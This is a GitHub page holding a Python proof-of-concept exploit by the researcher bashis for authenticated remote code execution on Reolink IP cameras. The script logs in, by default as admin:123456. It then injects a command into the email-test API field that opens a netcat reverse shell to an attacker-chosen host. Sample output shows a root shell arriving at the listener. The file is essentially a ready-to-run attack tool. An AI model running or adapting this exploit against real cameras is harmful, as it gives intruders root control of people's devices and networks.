=== Content from github.com_7e2150da_20250121_001710.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmcw0%2FPoC%2Fblob%2Fmaster%2FReolink-IPC-RCE.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmcw0%2FPoC%2Fblob%2Fmaster%2FReolink-IPC-RCE.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mcw0%2FPoC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mcw0](/mcw0)
/
**[PoC](/mcw0/PoC)**
Public

* [Notifications](/login?return_to=%2Fmcw0%2FPoC) You must be signed in to change notification settings
* [Fork
  304](/login?return_to=%2Fmcw0%2FPoC)
* [Star
   725](/login?return_to=%2Fmcw0%2FPoC)

* [Code](/mcw0/PoC)
* [Pull requests
  0](/mcw0/PoC/pulls)
* [Actions](/mcw0/PoC/actions)
* [Projects
  0](/mcw0/PoC/projects)
* [Security](/mcw0/PoC/security)
* [Insights](/mcw0/PoC/pulse)

Additional navigation options

* [Code](/mcw0/PoC)
* [Pull requests](/mcw0/PoC/pulls)
* [Actions](/mcw0/PoC/actions)
* [Projects](/mcw0/PoC/projects)
* [Security](/mcw0/PoC/security)
* [Insights](/mcw0/PoC/pulse)

## Files

 master
## Breadcrumbs

1. [PoC](/mcw0/PoC/tree/master)
/
# Reolink-IPC-RCE.py

Copy path Blame  Blame
## Latest commit

## History

[History](/mcw0/PoC/commits/master/Reolink-IPC-RCE.py)394 lines (338 loc) · 9.75 KB master
## Breadcrumbs

1. [PoC](/mcw0/PoC/tree/master)
/
# Reolink-IPC-RCE.py

Top
## File metadata and controls

* Code
* Blame

394 lines (338 loc) · 9.75 KB[Raw](https://github.com/mcw0/PoC/raw/refs/heads/master/Reolink-IPC-RCE.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393#!/usr/bin/env python2.7# [SOF]## Subject: Reolink {IPC} RCE (2018 bashis)## Attack vector: Remote# Authentication: Authenticated# Researcher: bashis <mcw noemail eu>##"""$ ./Reolink-IPC-RCE.py --rhost 192.168.57.20 --rport 80 --lhost 192.168.57.1 --lport 1337 --auth admin:pwn
Reolink {IPC} RCE (2018 bashis)
[i] Remote target IP: 192.168.57.20[i] Remote target PORT: 80[i] Connect back IP: 192.168.57.1[i] Connect back PORT: 1337[>] Sending: Login, Creds: admin:pwn[<] cmd: Login, token: 60cd6569207ed11[>] Sending: TestEmail RCE[<] cmd: TestEmail, result: 200[>] Sending: Logout[<] cmd: Logout, result: 200[i] All done
[Listener]$ ncat -vlp 1337Ncat: Version 7.60 ( https://nmap.org/ncat )Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.Ncat: SHA-1 fingerprint: B975 F261 BA42 C65D 9FDD 9BF9 BD2B B8C7 07FC F253Ncat: Listening on :::1337Ncat: Listening on 0.0.0.0:1337Ncat: Connection from 192.168.57.20.Ncat: Connection from 192.168.57.20:36668.pwd/mnt/appiduid=0(root) gid=0(root)exit$"""import socketimport sysimport urllib, urllib2, httplibimport sslimport argparseimport base64import osimport sysimport json
class HTTPconnect:
 def \_\_init\_\_(self, host, proto, verbose, credentials, Raw, noexploit): self.host = host self.proto = proto self.verbose = verbose self.credentials = credentials self.Raw = Raw self.noexploit = noexploit  def Send(self, uri, query\_headers, query\_data, ID): self.uri = uri self.query\_headers = query\_headers self.query\_data = query\_data self.ID = ID
 # Connect-timeout in seconds timeout = 10 socket.setdefaulttimeout(timeout)
 url = '{}://{}{}'.format(self.proto, self.host, self.uri)
 if self.verbose: print "[Verbose] Sending:", url
 if self.proto == 'https': if hasattr(ssl, '\_create\_unverified\_context'): print "[i] Creating SSL Unverified Context" ssl.\_create\_default\_https\_context = ssl.\_create\_unverified\_context
 if self.credentials: Basic\_Auth = self.credentials.split(':') if self.verbose: print "[Verbose] User:",Basic\_Auth[0],"Password:",Basic\_Auth[1] try: pwd\_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm() pwd\_mgr.add\_password(None, url, Basic\_Auth[0], Basic\_Auth[1]) auth\_handler = urllib2.HTTPBasicAuthHandler(pwd\_mgr) opener = urllib2.build\_opener(auth\_handler) urllib2.install\_opener(opener) except Exception as e: print "[!] Basic Auth Error:",e sys.exit(1)
 if self.noexploit and not self.verbose: print "[<] 204 Not Sending!" html = "Not sending any data" return html else: if self.query\_data: req = urllib2.Request(url, self.query\_data, headers=self.query\_headers) else: req = urllib2.Request(url, None, headers=self.query\_headers) try: rsp = urllib2.urlopen(req) except Exception as e: print "[<] {}".format(str(e)) return False
 if self.Raw: return rsp else: html = rsp.read() return html
## Validate correctness of HOST, IP and PORT#class Validate:
 def \_\_init\_\_(self,verbose): self.verbose = verbose
 # Check if IP is valid def CheckIP(self,IP): self.IP = IP
 ip = self.IP.split('.') if len(ip) != 4: return False for tmp in ip: if not tmp.isdigit(): return False i = int(tmp) if i < 0 or i > 255: return False return True
 # Check if PORT is valid def Port(self,PORT): self.PORT = PORT
 if int(self.PORT) < 1 or int(self.PORT) > 65535: return False else: return True
 # Check if HOST is valid def Host(self,HOST): self.HOST = HOST
 try: # Check valid IP socket.inet\_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP # Now we check if it is correct typed IP if self.CheckIP(self.HOST): return self.HOST else: return False except socket.error as e: # Else check valid FQDN, and use the IP address try: self.HOST = socket.gethostbyname(self.HOST) return self.HOST except socket.error as e: return False
if \_\_name\_\_ == "\_\_main\_\_":
 INFO = '\nReolink {IPC} RCE (2018 bashis)\n'
 rhost = '192.168.57.20' # Default Remote HOST rport = '80' # Default Remote PORT lhost = '192.168.57.1' # Default Local HOST lport = '1337' # Default Local PORT
 HTTP = "http" HTTPS = "https" proto = HTTP verbose = False noexploit = False raw\_request = True credentials = "admin:123456" # Default l/p# credentials = None
 headers = { 'Connection': 'close', 'Content-Type' : 'application/x-www-form-urlencoded', 'Accept' : 'gzip, deflate', 'Accept-Language' : 'en-US,en;q=0.8', 'Cache-Control' : 'max-age=0', 'User-Agent':'REOLINK/1.0' }
 try: arg\_parser = argparse.ArgumentParser( prog=sys.argv[0], description=('[\*] '+ INFO +' [\*]')) arg\_parser.add\_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']') arg\_parser.add\_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']') arg\_parser.add\_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']') arg\_parser.add\_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
 if credentials: arg\_parser.add\_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']') arg\_parser.add\_argument('-v','--verbose', required=False, default=False, action='store\_true', help='Verbose mode [Default: False]') args = arg\_parser.parse\_args() except Exception as e: print INFO,"\nError: {}\n".format(str(e)) sys.exit(1)
 print INFO
 if args.verbose: verbose = True
 if credentials and args.auth: credentials = args.auth
 if args.rport: rport = args.rport
 if args.rhost: rhost = args.rhost
 if args.lport: lport = args.lport
 if args.lhost: lhost = args.lhost
 # Check if RPORT is valid if not Validate(verbose).Port(rport): print "[!] Invalid RPORT - Choose between 1 and 65535" sys.exit(1)
 # Check if LPORT is valid if not Validate(verbose).Port(lport): print "[!] Invalid LPORT - Choose between 1 and 65535" sys.exit(1)
 # Check if RHOST is valid IP or FQDN, get IP back rhost = Validate(verbose).Host(rhost) if not rhost: print "[!] Invalid RHOST" sys.exit(1)
 # Check if LHOST is valid IP or FQDN, get IP back lhost = Validate(verbose).Host(lhost) if not lhost: print "[!] Invalid LHOST" sys.exit(1)
## Validation done, start print out stuff to the user# print "[i] Remote target IP:",rhost print "[i] Remote target PORT:",rport print "[i] Connect back IP:",lhost print "[i] Connect back PORT:",lport
 remote\_host = rhost+':'+rport
 LOGIN = [ { "cmd":"Login", "action":0, "param":{ "User":{ "userName":credentials.split(":")[0], "password":credentials.split(":")[1] } } } ]
 LOGOUT = [ { "cmd":"Logout", "action":0, "param":{} } ]
 RCE\_CMD = '$(mkfifo /mnt/tmp/s;nc LHOST LPORT </mnt/tmp/s|/bin/sh>/mnt/tmp/s 2>&1 ; rm -f /mnt/tmp/s)&' # Let's fork() RCE\_CMD = RCE\_CMD.replace('LHOST',lhost).replace('LPORT',lport) RCE = [ { "cmd":"TestEmail", "action":1, "param":{ "Email":{ "smtpServer":"smtp.gmail.com", "nickName":"", "smtpPort":465, "userName":"pwn@reolink.com", "password":"", "addr1":RCE\_CMD, "addr2":"", "addr3":"", "interval":"5 Minutes", "ssl":1, "attachment":"picture" } } } ]
 # # Login # print "[>] Sending: Login, Creds: {}".format(credentials) URI = '/cgi-bin/api.cgi?cmd=Login&token=null' response = HTTPconnect(remote\_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGIN),None) if response: JSON = json.loads(response) if verbose: print json.dumps(JSON,indent=4)
 if JSON[0]['code'] != 0: print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']) print "[!] Exit" sys.exit(1) else: print response sys.exit(1) token = JSON[0]['value']['Token']['name'] print "[<] cmd: {}, token: {}".format(JSON[0]['cmd'],token)
 # # RCE # print "[>] Sending: TestEmail RCE" URI = '/cgi-bin/api.cgi?cmd=TestEmail&file=config-file&token=' + token response = HTTPconnect(remote\_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(RCE),None) if response: JSON = json.loads(response) if verbose: print json.dumps(JSON,indent=4)
 if JSON[0]['code'] != 0: print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']) print "[>] Sending: Logout" URI = '/cgi-bin/api.cgi?cmd=Logout&token=' + token response = HTTPconnect(remote\_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGOUT),None) if response: JSON = json.loads(response) if verbose: print json.dumps(JSON,indent=4)
 if JSON[0]['code'] != 0: print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']) print "[!] Exit" sys.exit(1) else: print response sys.exit(1) print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])
 print "[!] Exit" sys.exit(1) else: print response sys.exit(1) print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])
 # # Logout # print "[>] Sending: Logout" URI = '/cgi-bin/api.cgi?cmd=Logout&token=' + token response = HTTPconnect(remote\_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGOUT),None) if response: JSON = json.loads(response) if verbose: print json.dumps(JSON,indent=4)
 if JSON[0]['code'] != 0: print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']) print "[!] Exit" sys.exit(1) else: print response sys.exit(1) print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])
 print "[i] All done"
# [EOF]

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


